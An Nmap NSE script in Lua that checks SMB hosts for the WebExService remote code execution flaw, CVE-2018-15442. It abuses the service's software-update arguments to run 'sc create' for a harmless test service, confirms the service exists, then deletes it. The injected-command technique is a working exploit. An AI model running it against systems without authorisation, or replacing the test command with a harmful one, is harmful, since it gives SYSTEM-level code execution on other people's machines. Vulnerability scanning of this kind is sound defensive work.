local msrpc = require "msrpc"
local rand = require "rand"
local shortport = require "shortport"
local smb = require "smb"
local stdnse = require "stdnse"
local vulns = require "vulns"

description = [[
Checks whether the WebExService is installed and allows us to run code.

Note: Requires a user account (local or domain).

References:
* https://www.webexec.org
]]

---
-- @usage
-- nmap --script smb-vuln-webexec --script-args smbusername=<username>,smbpass=<password> -p445 <host>
--
-- @output
-- PORT    STATE SERVICE      REASON
-- 445/tcp open  microsoft-ds syn-ack
-- | smb-vuln-webexec:
-- |_  Vulnerable
--
-- PORT    STATE SERVICE      REASON
-- 445/tcp open  microsoft-ds syn-ack
-- | smb-vuln-webexec:
-- |_  ERROR: Not vulnerable: Could open WebExService, but could not execute code

author = "Ron Bowes"
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"intrusive","vuln"}

portrule = shortport.port_or_service({445, 139}, "microsoft-ds", "tcp", "open")

action = function(host, port)
  local open_result
  local close_result
  local bind_result
  local result
  local test_service = rand.random_string(16, "0123456789abcdefghijklmnoprstuvzxwyABCDEFGHIJKLMNOPRSTUVZXWY")

  local vuln = {
    title = "Remote Code Execution vulnerability in WebExService",
    IDS = {CVE = 'CVE-2018-15442'},
    risk_factor = "HIGH",
    description = "A critical remote code execution vulnerability exists in WebExService (WebExec).",
    references = {
      'https://webexec.org' -- TODO: We can add Cisco's advisory here
    },
    dates = {
      disclosure = {year = '2018', month = '10', day = '24'}, -- TODO: Update with the actual date
    },
    status = vulns.STATE.NOT_VULN
  }

  local report = vulns.Report:new(SCRIPT_NAME, host, port)

  local status, smbstate = msrpc.start_smb(host, msrpc.SVCCTL_PATH)
  if not status then
    vuln.check_results = "Could not connect to smb: " .. smbstate
    return report:make_output(vuln)
  end

  status, bind_result = msrpc.bind(smbstate, msrpc.SVCCTL_UUID, msrpc.SVCCTL_VERSION, nil)

  if not status then
    smb.stop(smbstate)
    return nil, stdnse.format_output(false, bind_result)
  end

  local result, username, domain = smb.get_account(host)
  if result then
    if domain and domain ~= "" then
      username = domain .. "\\" .. stdnse.string_or_blank(username, '<blank>')
    end
  end

  -- Open the service manager
  stdnse.debug("Trying to open the remote service manager with minimal permissions")
  status, open_result = msrpc.svcctl_openscmanagerw(smbstate, host.ip, 0x00000001)

  if not status then
    smb.stop(smbstate)
    return nil, stdnse.format_output(false, open_result)
  end

  open_status, open_service_result = msrpc.svcctl_openservicew(smbstate, open_result['handle'], 'webexservice', 0x00010)
  if open_status == false then
    status, close_result = msrpc.svcctl_closeservicehandle(smbstate, open_result['handle'])
    smb.stop(smbstate)
    if string.match(open_service_result, 'NT_STATUS_SERVICE_DOES_NOT_EXIST') then
      vuln.check_results = "WebExService is not installed"
      return report:make_output(vuln)
    elseif string.match(open_service_result, 'NT_STATUS_WERR_ACCESS_DENIED') then
      vuln.check_results = "Could not open a handle to WebExService as " .. username
      return report:make_output(vuln)
    end

    vuln.check_results = "WebExService failed to open with an unknown status " .. open_service_result
    return report:make_output(vuln)
  end

  -- Create a test service that we can query
  local webexec_command = "sc create " .. test_service .. " binpath= c:\\fakepath.exe"
  stdnse.debug("Creating a test service: " .. webexec_command)
  status, result = msrpc.svcctl_startservicew(smbstate, open_service_result['handle'], stdnse.strsplit(" ", "install software-update 1 " .. webexec_command))
  if not status then
    vuln.check_results = "Could not start WebExService"
    return report:make_output(vuln)
  end

  -- We need some time for the service to run then stop again before we continue
  stdnse.sleep(1)

  -- Try and get a handle to the service with zero permissions
  stdnse.debug("Checking if the test service exists")
  local test_status, test_result = msrpc.svcctl_openservicew(smbstate, open_result['handle'], test_service, 0x00000)

  -- If the service DOES_NOT_EXIST, we couldn't run code
  if string.match(test_result, 'DOES_NOT_EXIST') then
    stdnse.debug("Result: Test service does not exist: probably not vulnerable")
    msrpc.svcctl_closeservicehandle(smbstate, open_result['handle'])

    vuln.check_results = "Could not execute code via WebExService"
    return report:make_output(vuln)
  end

  -- At this point, we know we're vulnerable!
  vuln.status = vulns.STATE.VULN

  -- Close the handle if we got one
  if test_status then
    stdnse.debug("Result: Got a handle to the test service, it's vulnerable!")
    msrpc.svcctl_closeservicehandle(smbstate, test_result['handle'])
  else
    stdnse.debug("Result: The test service exists, even though we couldn't open it (" .. test_result .. ") - it's vulnerable!")
  end

  -- Delete the service and clean up (ignore the return values because there's nothing more that we can really do)
  webexec_command = "sc delete " .. test_service .. ""
  stdnse.debug("Cleaning up the test service: " .. webexec_command)
  status, result = msrpc.svcctl_startservicew(smbstate, open_service_result['handle'], stdnse.strsplit(" ", "install software-update 1 " .. webexec_command))
  msrpc.svcctl_closeservicehandle(smbstate, open_result['handle'])
  smb.stop(smbstate)

  return report:make_output(vuln)
end
